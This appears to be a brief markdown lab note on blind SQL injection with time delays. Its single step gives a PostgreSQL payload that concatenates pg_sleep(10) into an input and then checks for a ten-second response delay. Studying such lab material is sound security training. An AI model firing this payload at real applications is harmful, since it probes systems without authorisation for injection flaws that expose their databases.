---
tags:
  - sqli
  - blind
  - time-delay
---

# Blind SQL injection with time delays

1. Send the following payload and observe that the application takes about 10 seconds to respond

```
OPsMuPyAX0GCHHIy'||pg_sleep(10)--
```

